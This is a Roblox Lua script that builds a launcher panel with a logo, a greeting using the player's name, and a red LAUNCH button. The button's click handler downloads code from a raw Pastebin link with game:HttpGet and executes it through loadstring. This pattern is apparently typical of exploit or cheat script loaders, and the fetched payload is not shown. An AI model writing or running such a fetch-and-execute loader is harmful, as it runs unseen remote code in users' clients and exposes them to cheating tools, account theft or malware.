local Players = game:GetService("Players")
local player = Players.LocalPlayer

 
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")

 
local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0.3, 0, 0.4, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)  
frame.BorderSizePixel = 0
frame.Parent = screenGui

 
local uiCornerFrame = Instance.new("UICorner")
uiCornerFrame.CornerRadius = UDim.new(0, 12)
uiCornerFrame.Parent = frame

 
local circle = Instance.new("Frame")
circle.Name = "LogoCircle"
circle.Size = UDim2.new(0, 40, 0, 40)
circle.Position = UDim2.new(0, 15, 0, 15)
circle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
circle.BorderSizePixel = 0
circle.Parent = frame

 
local uiCornerCircle = Instance.new("UICorner")
uiCornerCircle.CornerRadius = UDim.new(0.5, 0)
uiCornerCircle.Parent = circle

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "R"
textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)  
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold
textLabel.Parent = circle

 
local greeting = Instance.new("TextLabel")
greeting.Name = "GreetingLabel"
greeting.Size = UDim2.new(1, -40, 0.2, 0)
greeting.AnchorPoint = Vector2.new(0.5, 0)
greeting.Position = UDim2.new(0.5, 0, 0.3, 0)  
greeting.BackgroundTransparency = 1
greeting.Text = "Hello, " .. player.Name .. "!"
greeting.TextColor3 = Color3.fromRGB(255, 255, 255)
greeting.TextScaled = true
greeting.Font = Enum.Font.SourceSansBold
greeting.Parent = frame

 
local startButton = Instance.new("TextButton")
startButton.Name = "StartButton"
startButton.Size = UDim2.new(0.8, 0, 0.2, 0)
startButton.AnchorPoint = Vector2.new(0.5, 0)
startButton.Position = UDim2.new(0.5, 0, 0.75, 0)  
startButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
startButton.Text = "LAUNCH"
startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
startButton.TextScaled = true
startButton.Font = Enum.Font.SourceSansBold
startButton.Parent = frame

 local uiCornerButton = Instance.new("UICorner")
uiCornerButton.CornerRadius = UDim.new(0, 8)
uiCornerButton.Parent = startButton

 
startButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/hwJjdNMh"))()
    
    frame:Destroy()
end)

 
local defaultColor = startButton.BackgroundColor3
local hoverColor = Color3.fromRGB(200, 0, 0)

startButton.MouseEnter:Connect(function()
    startButton:TweenBackgroundColor3(hoverColor, "Out", "Quad", 0.1, false)
end)

startButton.MouseLeave:Connect(function()
    startButton:TweenBackgroundColor3(defaultColor, "Out", "Quad", 0.1, false)
end)